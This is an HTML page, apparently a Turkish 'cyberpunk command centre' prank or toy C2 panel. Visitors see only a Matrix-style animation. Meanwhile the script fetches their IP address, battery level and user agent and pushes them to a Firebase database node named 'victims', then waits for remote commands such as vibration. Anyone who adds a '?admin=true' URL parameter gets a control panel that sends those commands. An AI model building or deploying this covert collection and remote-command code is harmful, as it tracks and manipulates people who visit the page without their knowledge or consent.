<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Siber-Punk Komuta Merkezi</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/framer-motion/6.5.1/framer-motion.min.js"></script>
    <style>
        body {
            background-color: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        .matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10;
        }
        .matrix-code {
            font-family: monospace;
            font-size: 16px;
            line-height: 1.2;
            color: #00ff00;
            text-shadow: 0 0 5px #00ff00;
            animation: matrix 2s linear infinite;
        }
        @keyframes matrix {
            0% {
                opacity: 0;
                transform: translateY(-100%);
            }
            10% {
                opacity: 1;
                transform: translateY(0);
            }
            90% {
                opacity: 1;
                transform: translateY(0);
            }
            100% {
                opacity: 0;
                transform: translateY(100%);
            }
        }
        .terminal {
            background-color: #111;
            border: 2px solid #00ff00;
            padding: 20px;
            margin: 20px;
            box-shadow: 0 0 10px #00ff00;
            border-radius: 10px;
            display: none;
        }
        .task-button {
            background-color: #00ff00;
            color: #000;
            padding: 10px 20px;
            margin: 5px;
            border: none;
            cursor: pointer;
            transition: all 0.3s;
            border-radius: 5px;
            font-weight: bold;
            text-shadow: 0 0 2px #000;
        }
        .task-button:hover {
            background-color: #00aa00;
            transform: scale(1.05);
        }
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background-color: #00ff00;
            color: #000;
            padding: 10px 20px;
            border-radius: 5px;
            display: none;
            z-index: 20;
        }
        .scan-animation {
            display: none;
            text-align: center;
            margin-top: 50px;
        }
        .scan-line {
            width: 100%;
            height: 2px;
            background-color: #00ff00;
            position: relative;
            animation: scan 2s linear infinite;
        }
        @keyframes scan {
            0% {
                top: 0;
            }
            100% {
                top: 100%;
            }
        }
    </style>
</head>
<body>
    <div id="matrixScreen" class="matrix">
        <div class="matrix-code">
            <pre id="matrixText"></pre>
        </div>
    </div>
    <div id="commandCenter" class="terminal">
        <h1 class="text-2xl font-bold mb-4">Siber-Punk Komuta Merkezi</h1>
        <div class="mb-4">
            <button class="task-button" onclick="sendTask('flashlight')">Flashlight Aç</button>
            <button class="task-button" onclick="sendTask('vibration')">Vibration Gönder</button>
            <button class="task-button" onclick="sendTask('message')">Mesaj Pop-up Çıkar</button>
        </div>
        <div id="taskStatus" class="mt-4"></div>
    </div>
    <div id="notification" class="notification"></div>
    <script>
        // Firebase yapılandırması
        const firebaseConfig = {
            apiKey: "AIzaSyD3X5Y7Z9C1V3B5N7M9K1L3J5H7G9F1D3",
            authDomain: "siber-punk-komuta.firebaseapp.com",
            databaseURL: "https://siber-punk-komuta-default-rtdb.firebaseio.com",
            projectId: "siber-punk-komuta",
            storageBucket: "siber-punk-komuta.appspot.com",
            messagingSenderId: "1234567890",
            appId: "1:1234567890:web:abcdef1234567890"
        };
        
        // Firebase başlat
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        
        // URL parametrelerini kontrol et
        const urlParams = new URLSearchParams(window.location.search);
        const isAdmin = urlParams.get('admin');
        
        // Matrix animasyonu için rastgele karakterler oluştur
        function generateMatrixCode() {
            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            let result = "";
            for (let i = 0; i < 1000; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }
        
        // Matrix animasyonunu başlat
        function startMatrixAnimation() {
            const matrixText = document.getElementById('matrixText');
            setInterval(() => {
                matrixText.textContent = generateMatrixCode();
            }, 100);
        }
        
        // Cihaz bilgilerini al ve Firebase'e kaydet
        async function getDeviceInfo() {
            try {
                // IP adresini al
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ipAddress = ipData.ip;
                
                // Pil seviyesini al (sadece mobil cihazlar için)
                let batteryLevel = 'N/A';
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryLevel = (battery.level * 100).toFixed(0) + '%';
                }
                
                // Cihaz markasını al
                const deviceBrand = navigator.userAgent;
                
                // Bilgileri Firebase'e kaydet
                database.ref('victims').push({
                    ip: ipAddress,
                    battery: batteryLevel,
                    device: deviceBrand,
                    timestamp: firebase.database.ServerValue.TIMESTAMP
                });
            } catch (error) {
                console.error('Cihaz bilgileri alınamadı:', error);
            }
        }
        
        // Sayfa yüklendiğinde ekranı göster
        window.onload = function() {
            if (isAdmin === 'true') {
                document.getElementById('matrixScreen').style.display = 'none';
                document.getElementById('commandCenter').style.display = 'block';
            } else {
                document.getElementById('matrixScreen').style.display = 'block';
                startMatrixAnimation();
                getDeviceInfo();
                listenForCommands();
            }
        };
        
        // Komutları dinle
        function listenForCommands() {
            database.ref('commands').on('value', (snapshot) => {
                const command = snapshot.val();
                if (command === 'vibration') {
                    navigator.vibrate([100, 50, 100]);
                    database.ref('commands').set(null);
                }
            });
        }
        
        // Görev gönderme fonksiyonu
        function sendTask(task) {
            database.ref('commands').set(task);
            document.getElementById('taskStatus').innerHTML = `<p>Görev gönderildi: ${task}</p>`;
        }
        
        // Görev tamamlandığında bildirim göster
        function showNotification(message) {
            const notification = document.getElementById('notification');
            notification.innerHTML = message;
            notification.style.display = 'block';
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }
    </script>
</body>
</html>